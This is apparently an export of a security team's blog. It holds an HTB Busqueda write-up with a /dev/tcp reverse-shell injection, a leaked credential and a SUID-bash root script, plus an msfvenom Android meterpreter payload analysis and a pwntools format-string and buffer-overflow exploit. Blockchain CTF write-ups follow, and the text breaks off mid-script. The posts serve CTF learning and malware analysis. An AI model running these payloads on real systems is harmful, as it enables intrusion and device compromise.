.gitconfig\ndrwx------ 3 svc  svc  4.0K Jun 18 13:20 .gnupg\ndrwxrwxr-x 5 svc  svc  4.0K Jun 15  2022 .local\nlrwxrwxrwx 1 root root    9 Apr  3 08:58 .mysql_history -&gt; /dev/null\n-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile\nlrwxrwxrwx 1 root root    9 Feb 20 14:08 .searchor-history.json -&gt; /dev/null\ndrwx------ 3 svc  svc  4.0K Jun 18 13:13 snap\ndrwxr-xr-x 2 svc  svc  4.0K Jun 18 14:11 .ssh\n-rw-r----- 1 root svc    33 Jun 18 13:05 user.txt\nbash-5.1$ cat .gitconfig\n[user]\n        email = cody@searcher.htb\n        name = cody\n[core]\n        hooksPath = no-hooks\n</code></pre><p></p> <p>Interesting. Lets keep searching. Cheking hosts file we'll find a <code>gitea</code> subdomain, add it to our hosts file in attacker machine and there is a gitea running on the subdomain, searching through that we'll find two users and nothing more. <code>cody</code> which looks like it's the user we have access and <code>administrator</code>.</p> <p>Next I checked the services running </p><pre><code>bash-5.1$ ps -aux\nsvc         1719  0.0  0.9 261144 19816 ?        Ssl  13:05   0:03 python3 /var/www/app/app.py\nsvc        36488  0.0  0.8  23872 16144 ?        S    15:10   0:00 /usr/bin/python3 /usr/local/bin/searchor search Accuweather '+str(__import__('os').system('bash -c \"bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1\"'))+'\nsvc        36489  0.0  0.0   2888  1000 ?        S    15:10   0:00 sh -c bash -c \"bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1\"\nsvc        36617  0.0  0.1  10332  3840 ?        R    15:44   0:00 ps -aux\n</code></pre> lets check the python app that we got our initial access exploiting it. <pre><code>bash-5.1$ ls -lah \ntotal 20K\ndrwxr-xr-x 4 www-data www-data 4.0K Apr  3 14:32 .\ndrwxr-xr-x 4 root     root     4.0K Apr  4 16:02 ..\n-rw-r--r-- 1 www-data www-data 1.1K Dec  1  2022 app.py\ndrwxr-xr-x 8 www-data www-data 4.0K Jun 18 13:05 .git\ndrwxr-xr-x 2 www-data www-data 4.0K Dec  1  2022 templates\n</code></pre><p></p> <p>checking inside <code>.git</code> folder and we'll find credential for the user <code>cody</code> in config file. </p><pre><code>bash-5.1$ cat .git/config\n[core]\n        repositoryformatversion = 0\n        filemode = true\n        bare = false\n        logallrefupdates = true\n[remote \"origin\"]\n        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git\n        fetch = +refs/heads/*:refs/remotes/origin/*\n[branch \"main\"]\n        remote = origin\n        merge = refs/heads/main\n</code></pre><p></p> <p>Using this password we can log into gitea but it's just source of the searcher site and nothing more. But as the cody .gitconfig was in the user home directory I thought it might be the users password too and I was right.</p> <p>So first thing to do for priv-esc that wasn't possible before is </p><pre><code>bash-5.1$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nbash-5.1$ sudo -l \nsudo -l\n[sudo] password for svc: jh1usoih2bkjaspwe92\n\nMatching Defaults entries for svc on busqueda:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\n    use_pty\n\nUser svc may run the following commands on busqueda:\n    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *\n</code></pre> And yesss there is a command to run as root\ud83e\udd73 but let's not count chickens before they hatch and see what does the command do.<p></p> <p></p><pre><code>bash-5.1$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *\nUsage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2)\n\n     docker-ps     : List running docker containers\n     docker-inspect : Inpect a certain docker container\n     full-checkup  : Run a full system checkup\n</code></pre> Ok I'll admit it I got excited too soon there still a couple of things to do.<p></p> <p>Well the full-checkup gives <code>Something went wrong</code>, docker-ps shows there is two container running and doesn't use the arguments provided.</p> <p>Last but not least docker-inspect the most interesting one. </p><pre><code>bash-5.1$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect\nUsage: /opt/scripts/system-checkup.py docker-inspect &lt;format&gt; &lt;container_name&gt;\n</code></pre> After reading about format in docker-inspect manual I thought I might be able to get a shell somehow using an command injection but I couldn't do that so dove more into documentation and started reading every config that docker-inspect gave me using the format \"{{json .}}\" and BINGO.  It's database credentials and we can log into mysql using <code>mysql -u gitea -h 127.0.0.1 -p</code> but even though the hash of administrator is in there but it's not crackable. As the way the user cody password found I tried the same password on administrator account and it worked.<p></p> <p>There is another private repository in administrator account which is the scripts in /opt folder and the source of the script that we can run using sudo. Let's see what are we running.  Can you see where is the vulnerability and why we kept getting <code>something went wrong</code> when trying <code>full-checkup</code>? Because of <code>./full-checkup.sh</code> running the sudo command in <code>/opt/scripts</code> will do as it should but in <code>/tmp</code> with our malicious script? It'll give us root access. </p><pre><code>#!/bin/bash\ncp /bin/bash /tmp\nchmod +s /tmp/bash\n</code></pre> this script will copy bash in tmp and add suid permission to it and we can get root using <code>/tmp/bash -p</code> and get root flag ;) <p></p>"},{"location":"Blog-Posts/HTB-Busqueda-Machine-Writeup/#authors","title":"Authors","text":"<p>Written by D4rkNebula</p>"},{"location":"Blog-Posts/Msfvenom-Android-Malware-Analysis/","title":"Analyzing MSFVenom Android Payload (Malware)","text":"<p>MSFVenom is one of the most popular frameworks to create payloads, shellcodes, etc. I want to analyze a little bit of MSFVenom Android payload. So</p> <p> </p>","tags":["Android","Malware","MalwareAnalysis","ReverseEngineering","MSFVenom","Metasploit"]},{"location":"Blog-Posts/Msfvenom-Android-Malware-Analysis/#part-1-creating-an-android-payload-with-msfvenom","title":"\ud83c\udfac Part 1 - Creating an Android payload with MSFVenom","text":"<p>Run your Kali Linux distribution (I use vagrant kalilinux/rolling box) and open a terminal. </p><pre><code># Installing Kali Linux Box\nvagrant box add kalilinux/rolling\n\n# Create a Kali Linux VM\nmkdir -p /home/$USER/Desktop/vagrantmachines/kali\ncd /home/$USER/Desktop/vagrantmachines/kali\nvagrant init kalilinux/rolling\n\n# Set Kali Network to Bridge\n# Add below line into Vagrantfile file below config.vm.box = \"kalilinux/rolling\"\n  config.vm.network \"public_network\"\n# Save and Exit from Vagrantfile\n\n# Execute Kali Machine\nvagrant up\n\n# SSH to Kali Machine\nvagrant ssh\n\n# If you want to turn it off just execute the below command after you exit from SSH\nvagrant halt\n</code></pre><p></p> <p>Simply execute the below command. </p><pre><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=$(ip addr show eth0 | grep -Po 'inet \\K[\\d.]+') LPORT=1337 &gt; malicious.apk\n</code></pre> * <code>-p</code>: choosing payload * <code>LHOST</code>: listener IP address (C2) * <code>LPORT</code>: listener Port number (C2) * <code>&gt; malicious.apk</code>: output of executed command (attacker payload)<p></p> <p>After that, I copy malicious.apk to <code>/vagrant</code> which let me access it from my computer. </p><pre><code>cp malicious.apk /vagrant\n</code></pre><p></p>","tags":["Android","Malware","MalwareAnalysis","ReverseEngineering","MSFVenom","Metasploit"]},{"location":"Blog-Posts/Msfvenom-Android-Malware-Analysis/#part-2-static-analysis-with-jadx-gui","title":"\ud83c\udfac Part 2 - Static Analysis with Jadx-Gui","text":"<p>Now I have malicious.apk besides Vagrantfile. Let's start with static analysis. Open it with the jadx-gui. Let's see what AndroidManifest.xml does have for us.</p> <p></p> <p>We have an activity called <code>MainActivity</code> (package: <code>com.metasploit.stage</code>) which is our first activity that'll execute.</p> <p></p> <p>We can also see there is a <code>BroadcastReceiver</code> with <code>android.intent.action.BOOT_COMPLETED</code> action. It is obvious that this malware use this permission to execute itself after restarting mobile.</p> <p></p> <p>Let's have a look at <code>MainActivity</code>. It simply calls <code>startService()</code> method from <code>MainService</code> class.</p> <p></p> <p><code>MainService</code> class extended (inherited) from Service, so it's a service that we are dealing with.</p> <p></p> <p>In this method again <code>startService</code> function is called, but as we said we are in a service and it calls <code>MainService.class</code> in <code>Intent()</code>. </p><pre><code>public static void startService(Context context) {\n    context.startService(new Intent(context, MainService.class));\n}\n</code></pre><p></p> <p>So this time <code>onStartCommand()</code> method will call. <code>onStartCommand()</code> is called every time a client starts the service using <code>startService(Intent intent)</code>.</p> <p></p> <p>This method, calls <code>start()</code> from <code>Payload</code> class. Now let's go deeper and see what the<code>start()</code> method does.</p> <p></p> <p><code>start()</code> function calls <code>startInPath()</code> function, and <code>startInPath()</code> function calls <code>e().start()</code> that lead us to analyse that class and method.</p> <p></p> <p>There is nothing but execute the <code>main()</code> method from the <code>Payload</code> class again. We have to back to where we were and analyze the <code>main()</code> function.</p> <p></p> <p>It's a huge function that can't even fit in one screenshot. We can see there is a <code>Socket socket</code> which indicates we are dealing with a socket connection that's probably attacker C2. Also there is a line contains <code>a a2 = b.a(a);</code>. It passes <code>a</code> variable to <code>b.a()</code> method and save results in <code>a2</code>. Left-click on the <code>a</code> parameter and press <code>d</code> on your keyboard (that is a shortcut to get you where the variable is declared).</p> <p></p> <p>It seems a huge array which i guess it can be an IP address or an URL. To make sure of this, I go to <code>b.a()</code> method.</p> <p></p> <p>Again it's a huge function, but this is obvious it decrypts that array. I don't want to waste my time and try to understand that algorithm, I'll deal with it in the dynamic analysis part. But we have to figure out where it stores the decrypted data. You can see <code>gVar</code> everywhere in this function.</p> <p></p> <p>If you open the <code>g</code> class, you can see there is nothing but a bunch of variables. Now I'm sure it stores the decrypted data in that class's variables.</p> <p></p> <p>In the <code>Payload.main()</code>, after that decryption method, we can see bunch of <code>while(){}</code>, <code>try{}</code> and <code>if(){}</code>.</p> <p></p> <p>Take a look at where I pointed (ofc with a red arrow).</p> <p></p> <p>You can see we have a <code>socket.getOutputStream()</code> there that passed to <code>a()</code>. If you go to where <code>a()</code> declared, you see there's <code>getClassLoader()</code>. This method let you load the Dex file dynamically. It uses to bypass AV, and it makes APK file size smaller.</p> <p>Overall, this APK file connects to attacker C2 (MSFVenom) and downloads a Dex (or JAR) file, loads it and after that, it will be deleted. Now Let's continue our journey in the dynamic analysis part.</p>","tags":["Android","Malware","MalwareAnalysis","ReverseEngineering","MSFVenom","Metasploit"]},{"location":"Blog-Posts/Msfvenom-Android-Malware-Analysis/#part-3-dynamic-analysis","title":"\ud83c\udfac Part 3 - Dynamic Analysis","text":"<p>For the first step of dynamic analysis, I want to extract the attacker's C2 IP address. As we saw in the static analysis, the decrypted attacker IP address is in the <code>g</code> class. Let's dump data from that class. I use Android Studio to do this. But an important thing that is worth mentioning is \"We have to do this quickly before anything happens and malware closes itself and runs itself as a service\" because you saw it creates a service after execution. Make sure your USB Debugging is enabled.</p> <p></p> <p>But we have to do one thing more before debugging. We have to make this malicious APK debuggable. To do this as easily as possible, I do this with APKLab. The installation steps are explained in APKLab Github.</p> <p>Now open the malicious APK file with APKLab, Then Right-click on <code>apktool.yml</code> and Left-click on <code>APKLab: Rebuild the APK</code>.</p> <p></p> <p>Make sure you check <code>--debug</code> in the opened window.</p> <p></p> <p>The rebuilt APK output file is located in the <code>dist</code> folder.</p> <p></p> <p>Use <code>adb</code> to install the rebuilt APK file.</p> <pre><code>adb install rebuilt-malicious.apk\n</code></pre> <p>Now let's analyze <code>g</code> class memory. Open Android Studio and choose Profile or Debug APK.</p> <p></p> <p>Now instead of sending 10 images, I would rather make a GIF to show the process how to extract data from the <code>g</code> class. \u26a0\ufe0f GIF file size is around 6 Mb, Just in case of any problem you can download the GIF file with this GIF URL via the <code>wget</code>.</p> <p></p> <p>OK. We've successfully got the attacker's C2 IP address. Now how we can dump that DEX which is loaded with DexClassLoader. As we know from static analysis, Malware deletes the DEX file after loading it. So we don't have access to that anymore. We have to uninstall malware and install it again, but this time I hook the <code>delete()</code> method from <code>java.io.File</code> to disable its functionality.</p> <p>Installing Frida</p> <pre><code>pip install frida-tools\n</code></pre> <p>Download the latest version of frida-server from here that is compatible with your mobile CPU architecture. Installing FridaServer in your mobile. </p><pre><code>adb push frida-server-15.1.17-android-x86.xz /data/local/tmp\nadb shell\nMobile #&gt; cd /data/local/tmp\nMobile #&gt; unxz frida-server-15.1.17-android-x86.xz\nMobile #&gt; chmod +x frida-server-15.1.17-android-x86\nMobile #&gt; ./frida-server-15.1.17-android-x86\n</code></pre><p></p> <p>Let's write our hooking code (i named it hook.js) with Frida.</p> <pre><code>Java.perform(function(){\n  var filecls = Java.use(\"java.io.File\");\n  filecls[\"delete\"].overload().implementation = function(){console.log(\"delete() hooked!\"); return true;}\n});\n</code></pre> <p>Now uninstall <code>com.metasploit.stage</code> package.</p> <p></p><pre><code>adb uninstall com.metasploit.stage\n</code></pre> And install it again.<p></p> <pre><code>adb install rebuilded-malicious.apk\n</code></pre> <p>But this time you must use Frida to execute it.</p> <p></p><pre><code>frida -Uf com.metasploit.stage -l hook.js --no-pause\n</code></pre> You can see <code>File.delete()</code> hooked 4 times! Then use <code>adb</code> to download DEX &amp; JAR files that are downloaded.<p></p> <p></p> <p>I go to the <code>files</code> folder, there is 4 files.</p> <p></p> <p>I open <code>xz3z7c.jar</code> with <code>jadx-gui</code>, It downloads <code>met.jar</code> and <code>met.dex</code>, then it loads <code>com.metasploit.meterpreter.AndroidMeterpreter</code>. This class loaded from <code>met</code>.</p> <p></p> <p>Let's open <code>met.jar</code> with <code>jadx-gui</code>.</p> <p></p> <p>It contains a lot of files and functions. It also downloads and loads another JAR file. It's beyond of scope to analyze it in just 1 post. :) Try yourself and have a look at it. Maybe later I wrote the analysis of this JAR file.</p> <p>I hope you learned something.</p>","tags":["Android","Malware","MalwareAnalysis","ReverseEngineering","MSFVenom","Metasploit"]},{"location":"Blog-Posts/Msfvenom-Android-Malware-Analysis/#authors","title":"Authors","text":"<p>Written by Kousha Zanjani</p>","tags":["Android","Malware","MalwareAnalysis","ReverseEngineering","MSFVenom","Metasploit"]},{"location":"Blog-Posts/PWN-Stack-binary-exploiting-Writeup/","title":"PWN - Stack binary exploiting Writeup","text":"<p>About a month ago the WSIR 2023 national level was held and I was one of the competition designers and judges.</p> <p>Now, the blog wouldn't be good enough without at least one post about binary exploiting so here it is.</p> <p>This challenge is easy-medium and as I write this post I'll solve it at the same time. I'll try to explain my thought process as I go along, treating it as a black box (without having read the actual source code) (It's been a while so it'll be ok I guess).</p>"},{"location":"Blog-Posts/PWN-Stack-binary-exploiting-Writeup/#analysing-the-binary","title":"Analysing the binary","text":"<p>Well as anything else first we should analyse to see what we are dealing with, let's see. </p><pre><code>$ file stack                                                                                                                                                                                                                              \nstack: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=02dabf21c7908bf871d7a7144df54471ff8d3fb1, for GNU/Linux 3.2.0, not stripped\n</code></pre> Well the first good news is that the binary is dynamically linked. How about it's mitigations? <pre><code>$ checksec --file=stack\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n</code></pre> (I'll write a post about what are these and other basics of binary exploiting later and put the link here so this would be useful for everyone \ud83d\ude04 )<p></p> <p>well at least the PIE is not enable which mean that the virtual address of codes and objects will be static and will not change each time we run the program. Further I'll explain why is it useful.</p> <pre><code>Enter your name: \na\nWelcome user: \na\n\n1. Admin panel\n2. Change your name\n3. Reason you (the user) are here\nWhat do you want to do? \n</code></pre> <p>Running the program to analyse what it's supposed to do, we'll see that it basically just get our name and print it and other options are either disable or we don't have access to them.</p> <p>This leaves us with two options, first buffer overflow which is not possible at this point becuase the canary is enable (We know it from checksec command) so this leaves us with only one more thing to try.</p>"},{"location":"Blog-Posts/PWN-Stack-binary-exploiting-Writeup/#format-string","title":"Format String","text":"<p>Owasp </p><pre><code>Enter your name: \n%p\nWelcome user: \n0x1\n\n1. Admin panel\n2. Change your name\n3. Reason you (the user) are here\nWhat do you want to do? \n</code></pre><p></p> <p>I won't explain the format string vulnerability here, as I plan to write detailed posts about it and other topics related to pwn. I will provide a link to those posts later.</p> <p>So now we know the vulenrability that we have but what can we do with it? Well first of all we can get the value of canary so we can exploit bof if there is one in the program. We have arbitary read and write usually with format string and well there is alot we can do but first let's see what do we need.</p>"},{"location":"Blog-Posts/PWN-Stack-binary-exploiting-Writeup/#assembly-is-fun","title":"Assembly is fun","text":"<p>Ah s**t, here we go again. Jokes aside usually assembly isn't that frustrating, It's just a puzzle you need to solve using time and effort whether for reversing and cracking or exploiting or etc.</p> <p>I'll use r2 (radare2) for this challenge. Let's check the functions.</p> <p></p><pre><code>[0x7f1e458679c0]&gt; afl\n0x004010d0    1 34           entry0\n0x00401110    4 33   -&gt; 31   sym.deregister_tm_clones\n0x00401140    4 49           sym.register_tm_clones\n0x00401180    3 33   -&gt; 32   sym.__do_global_dtors_aux\n0x004011b0    1 6            entry.init0\n0x00401204   11 155          sym.admin\n0x0040147c    1 9            sym._fini\n0x0040129f    4 44           sym.ac\n0x004011b6    3 78           sym.itguy\n0x00401030    1 6            sym.imp.puts\n0x00401080    1 6            sym.imp.gets\n0x00401040    1 6            sym.imp.__stack_chk_fail\n0x004012cb    1 22           sym.func\n0x00401100    1 1            sym._dl_relocate_static_pie\n0x004012e1   10 250          main\n0x004013db    5 160          sym.disablefunction\n0x00401000    3 23           sym._init\n0x00401050    1 6            sym.imp.printf\n0x00401060    1 6            sym.imp.fgets\n0x00401070    1 6            sym.imp.getchar\n0x00401090    1 6            sym.imp.fopen\n0x004010a0    1 6            sym.imp.perror\n0x004010b0    1 6            sym.imp.__isoc99_scanf\n0x004010c0    1 6            sym.imp.exit\n</code></pre> If you are experienced in reversing, you will immediately notice the five interesting functions. But if you are not familiar with it, don't worry, you don't need to read all the functions. Start with the main function and check the custom functions inside it, then keep going. Let's take a look at the main function.  Alright, here is the 4 functionalities of menu. let's examine what's inside the func and ac functions, which correspond to option number three and one, respectively.  As we expected, the func function was empty, but the ac function is interesting. (Admin panel functionality) Why? becuase of the obj.isadmin variable, which is set to zero. This is why we can't login to the admin section. We can exploit format string to change that valueand this is the reason that disabled pie is good for us, even though it's not impossible to obtain the Vaddr of the object with enabled PIE. It's just easier without it, and in this case, we got lucky.<p></p>"},{"location":"Blog-Posts/PWN-Stack-binary-exploiting-Writeup/#exploiting","title":"Exploiting","text":"<p>Let's get into admin panel. First we need to find the object virtual address which can be accomplished in many different ways. Since I'm already in the r2 so I'll just run <code>px @obj.isadmin</code> and write the address.</p> <pre><code>[0x7f1e458679c0]&gt; px @obj.isadmin\n- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF\n0x0040406c  0000 0000 0000 0000 0000 0000 0000 0000  ................                                                                                                                                                                       \n0x0040407c  0000 0000 0000 0000 0000 0000 0000 0000  ................\n0x0040408c  0000 0000 0000 0000 0000 0000 0000 0000  ................\n</code></pre> <p>Now I'm going to use pwntools library and write an exploit for this section to see what is going on in the admin panel.</p> <p>Try it out yourself first but here's the code I wrote:</p> <p> Before going further, let's explain what is happening in the code.</p> <p>Well basically the code is getting the object addr automatically (I love automating), and generating and sending the payload for us to change that value but what's that 8 and how did I get that?</p> <p>The 8 is the offset for format string, basically the number that we can see our own input using format string. I found it as easy as just entring multiple <code>%p %p</code> and then checked which index was my input (I knew the hex code of my input) and the dictionary is to define change where to what.</p>"},{"location":"Blog-Posts/PWN-Stack-binary-exploiting-Writeup/#canary","title":"Canary \ud83d\udc26","text":"<p>Canary is static all over the program so once we capture it we can use it in one or another function it's not changing. Now how can we get that? Yeah using format string again we just need to find the offset and for that we'll use r2 to see what is the canary by examining fs+0x28 (or something else if it's different in the check) and get the value of that and then manually or automatically we check every offset to the value we got.</p> <pre><code>from pwn import *\n\ne = context.binary = ELF(\"./stack\")\n\nisadmin = e.sym[\"isadmin\"]\n\np = process()\n\np.sendline(fmtstr_payload(8, {isadmin: 1}))\n\np.interactive()\n\n# Attach r2 using pid and examine the 16bit value of fs+0x28 and get out of process interactive and put canary in the if below and we got the offset.\n\nfor i in range(30):\n    try:\n        p.sendline('2')\n        p.sendline(\"%\"+str(i)+\"$p\")\n        p.recvuntil('Welcome user')\n        p.recvline()\n        a=p.recvline()\n        if b'0xb1d00ccebad82000' in a:\n            print(i)\n            break\n    except Exception as e:\n        print(str(e))\n</code></pre> <p>Read the comment in the code...</p>"},{"location":"Blog-Posts/PWN-Stack-binary-exploiting-Writeup/#the-bof-xd","title":"THE BOF xD","text":"<p>now we have the canary offset and able to get to the bof all that is left to do is to find the bof offset and write the exploit.</p> <pre><code>from pwn import *\n\ne = context.binary = ELF(\"./stack\")\n\nisadmin = e.sym[\"isadmin\"]\n\np = process()\n\np.sendline(fmtstr_payload(8, {isadmin: 1}))\np.recv()\np.sendline(b'2\\n%17$p')\n\np.recvuntil('Welcome user')\np.recvline()\n\ncanary=int(p.recvline(),16)\n\npayload = b'\\x00'*24 # Padding\npayload += p64(canary) # Canary value\npayload = payload.ljust(40, b'\\x00') # Padding again\npayload += p64(e.sym['disablefunction']) # Address of disabled function\np.sendline(b'1\\n2\\n'+payload) # BOF\n\nprint(p.recvall()) # Get the flag\n</code></pre>"},{"location":"Blog-Posts/PWN-Stack-binary-exploiting-Writeup/#authors","title":"Authors","text":"<p>Written by D4rkNebula</p>"},{"location":"CTF/","title":"CTF","text":""},{"location":"CTF/#ctf","title":"CTF","text":"<p>Here we will publish our content related to CTFs, writeups, and challenges.</p>"},{"location":"CTF/writeups/","title":"Pr1m3d ctf writeups","text":""},{"location":"CTF/writeups/#pr1m3d-team-ctf-writeups","title":"Pr1m3d Team CTF writeups","text":"<p>Welcome to Pr1m3d Team CTF writeups.</p> <ul> <li>SnappCTF 2024</li> <li>JustCTF 2024 Teaser</li> <li>Cyber Apocalypse CTF 2024</li> </ul>"},{"location":"CTF/writeups/2023/cyber-apocalypse-2023/blockchain/navigating_the_unknown/","title":"navigating the unknown","text":""},{"location":"CTF/writeups/2023/cyber-apocalypse-2023/blockchain/navigating_the_unknown/#1-challenge-code-and-description","title":"1 - Challenge code and Description","text":"<pre><code>Your advanced sensory systems make it easy for you to navigate familiar environments, but you must rely on intuition to navigate in unknown territories.\nThrough practice and training, you must learn to read subtle cues and become comfortable in unpredictable situations.\nCan you use your software to find your way through the blocks?\n</code></pre> <p>Setup.sol </p><pre><code>pragma solidity ^0.8.18;\n\nimport {Unknown} from \"./Unknown.sol\";\n\ncontract Setup {\n    Unknown public immutable TARGET;\n\n    constructor() {\n        TARGET = new Unknown();\n    }\n\n    function isSolved() public view returns (bool) {\n        return TARGET.updated();\n    }\n}\n</code></pre><p></p> <p>Unknown.sol </p><pre><code>pragma solidity ^0.8.18;\n\ncontract Unknown {\n\n    bool public updated;\n\n    function updateSensors(uint256 version) external {\n        if (version == 10) {\n            updated = true;\n        }\n    }\n}\n</code></pre><p></p>"},{"location":"CTF/writeups/2023/cyber-apocalypse-2023/blockchain/navigating_the_unknown/#2-solution","title":"2 - Solution","text":"<p>Here we have two smart contracts named <code>Setup</code> and <code>Unknown</code>\\ We also have remote intances with two services first one is RPC service with http protocol and second one gives us two options:</p> <ol> <li>Connection information</li> <li>Restart Instance</li> <li>Get flag</li> </ol> <p>We can get our connection information with options 1 and here is the information we get</p> <ul> <li>Wallet Address</li> <li>Private Key</li> <li>Setup contract address</li> <li>Unknown contract address</li> </ul> <p>If we look at the contract source codes we can get the flag when <code>Unknown</code> contract <code>updated</code> field is set to true\\ We should interact with contract <code>Unknown</code> and call <code>updateSensors</code> function with input 10 to set it to True\\ I used web3 cli to call the <code>Unknown</code> contract <code>updateSensors</code> function with input 10</p> <p>First Let's get information from second service </p><pre><code>nc 206.189.112.129 30228\n1 - Connection information\n2 - Restart Instance\n3 - Get flag\naction? 1\n\nPrivate key     :  0xa2944fbcda9390aefb92358c82125e88ac383342b938098ad7cf301fb97eef3e\nAddress         :  0x667da262319cc42Ef6621B8c2d185CDc7Ee8bbDf\nTarget contract :  0x0D660A6e10114bee123Cca7f7712Bda372c4eFb3\nSetup contract  :  0x759b5313b4B8A1bf71A86c91E4178C316f41fA10\n</code></pre><p></p> <p>Here is the information we have: </p><pre><code>Wallet Address : 0x667da262319cc42Ef6621B8c2d185CDc7Ee8bbDf\nPrivate key : 0xa2944fbcda9390aefb92358c82125e88ac383342b938098ad7cf301fb97eef3e\nTarget contract address :  0x0D660A6e10114bee123Cca7f7712Bda372c4eFb3\nSetup contract address :  0x759b5313b4B8A1bf71A86c91E4178C316f41fA10\n</code></pre><p></p> <p>To use web3 cli we should set our <code>private key</code> and <code>RPC url</code></p> <pre><code>export WEB3_RPC_URL=http://206.189.112.129:32380/\nexport WEB3_PRIVATE_KEY=0xa2944fbcda9390aefb92358c82125e88ac383342b938098ad7cf301fb97eef3e\n</code></pre> <p>Now we should build our contract to generate abi files which are necessary for interacting with the network(You can read about more ABI)</p> <pre><code>web3 contract build Unknown.sol\n</code></pre> <p>We don't need to deploy the contract because it's allready deployed and we have it's address.\\ Now we can call the funtion we need like this with generated abi</p> <pre><code>web3 contract call --address '0x0D660A6e10114bee123Cca7f7712Bda372c4eFb3' --abi Unknown.abi --function updateSensors 10\n</code></pre> <p>With above command we call <code>updateSensors(10)</code> for Unknown contract which will satisfy the conditions to get flag from <code>Setup</code> contract </p><pre><code>nc 206.189.112.129 30228\n1 - Connection information\n2 - Restart Instance\n3 - Get flag\naction? 3\nFLAG=HTB{9P5_50FtW4R3_UPd4t3D}\n</code></pre><p></p> <p>And here is the flag </p><pre><code>FLAG=HTB{9P5_50FtW4R3_UPd4t3D}\n</code></pre><p></p> <p>Authors - Kourosh Rajabzadeh</p>"},{"location":"CTF/writeups/2023/cyber-apocalypse-2023/blockchain/shooting_101/","title":"shooting 101","text":""},{"location":"CTF/writeups/2023/cyber-apocalypse-2023/blockchain/shooting_101/#1-challenge-code-and-description","title":"1 - Challenge code and Description","text":"<pre><code>Your metallic body might have advanced targeting systems, but hitting a target is not just about technical proficiency.\nTo truly master the art of targeting, you must learn to trust your instincts and develop a keen sense of intuition.\nDuring this training, you will emerge as a skilled marksman who can hit the targets with deadly precision.\nIt's about time to train and prove yourself in the Shooting Area, can you make it?\n</code></pre> <p>Setup.sol: </p><pre><code>pragma solidity ^0.8.18;\n\nimport {ShootingArea} from \"./ShootingArea.sol\";\n\ncontract Setup {\n    ShootingArea public immutable TARGET;\n\n    constructor() {\n        TARGET = new ShootingArea();\n    }\n\n    function isSolved() public view returns (bool) {\n        return TARGET.firstShot() &amp;&amp; TARGET.secondShot() &amp;&amp; TARGET.thirdShot();\n    }\n}\n</code></pre><p></p> <p>ShootingArea.sol:</p> <pre><code>pragma solidity ^0.8.18;\n\ncontract ShootingArea {\n    bool public firstShot;\n    bool public secondShot;\n    bool public thirdShot;\n\n    modifier firstTarget() {\n        require(!firstShot &amp;&amp; !secondShot &amp;&amp; !thirdShot);\n        _;\n    }\n\n    modifier secondTarget() {   \n        require(firstShot &amp;&amp; !secondShot &amp;&amp; !thirdShot);\n        _;\n    }\n\n    modifier thirdTarget() {\n        require(firstShot &amp;&amp; secondShot &amp;&amp; !thirdShot);\n        _;\n    }\n\n    receive() external payable secondTarget {\n        secondShot = true;\n    }\n\n    fallback() external payable firstTarget {\n        firstShot = true;\n    }\n\n    function third() public thirdTarget {\n        thirdShot = true;\n    }\n}\n</code></pre>"},{"location":"CTF/writeups/2023/cyber-apocalypse-2023/blockchain/shooting_101/#2-solution","title":"2 - Solution","text":"<p>Accoring to this code section, to solve this challenge the 3 state variables <code>firstShot, secondShot, thirdShot</code> should be set to True </p><pre><code>function isSolved() public view returns (bool) {\n    return TARGET.firstShot() &amp;&amp; TARGET.secondShot() &amp;&amp; TARGET.thirdShot();\n}\n</code></pre><p></p> <p>We know that we can not change state variables of a contract directly and because we doon't have any setter function for these variables the only way to change their values is through <code>fallback, receive, third</code> function\\ <code>third</code> function is a normal function but <code>fallback</code> and <code>receive</code> are special functions which will be triggered in special conditions and we can not call them directly\\ According to this video <code>fallback</code> and <code>receive</code> can be triggered when facing errors like the calling function does not exist or lack of crypto-currency ...</p> <p>If we wanna try to send a custom transaction with arbitrary data we will encounter error which we can use to trigger fallback and receive function\\ Also one more important issue about the code is that we have three modifiers named <code>firstTarget, secondTarget, thirdTarget</code>.\\ According to this link, A midifier puts some conditions on a function. If the conditions are met the function would be executed else not.\\</p> <p>If we look at the modifiers, <code>fallback</code> function is dependant on <code>firstTarget</code> modifier which tells us in order to this <code>fallback</code> function be executed all state variables <code>firstShot, secondShot, thirdShot</code> should be False\\ Like that the <code>receive</code> function is dependant on <code>secondTarget</code> modifier which indicates that in order to trigger <code>receive</code> function the <code>firstShot</code> state variable should set to True And the third function is dependant on <code>thirdTarget</code> modifier which indicates that in order to call that function the <code>firstShot</code> and <code>secondShot</code> state variable should set to True.</p> <p>So to brief all we should trigger these 3 functions in this order 1. fallback 2. receive 3. third</p> <p>Let's first get connection infomation from second service</p> <pre><code>nc 165.22.116.7 31860\n1 - Connection information\n2 - Restart Instance\n3 - Get flag\naction? 1\n\nPrivate key     :  0xf1b75a27cee0e379746277b990bb7987815fd720d9fbbbbd0115b75d334c0272\nAddress         :  0x880D2D46b194678fe1990E0c859F0bEdB2A87F6f\nTarget contract :  0x5094b5864dbB733a98E2A201fd7419F4e908be7B\nSetup contract  :  0xFc5becb1a0026dd785AbCe82b52A31045164E2CF\n</code></pre> <p>For first and second shot which is <code>fallback</code> and <code>receive</code> function I used web3py: </p><pre><code>from web3 import Web3\n\nurl = 'http://165.22.116.7:30205/'\nwallet = '0x880D2D46b194678fe1990E0c859F0bEdB2A87F6f'\ntarget = '0x5094b5864dbB733a98E2A201fd7419F4e908be7B'\n\nw3 = Web3(Web3.HTTPProvider(url))\n\n# First Shot\n# This transaction will trigger fallback because it has 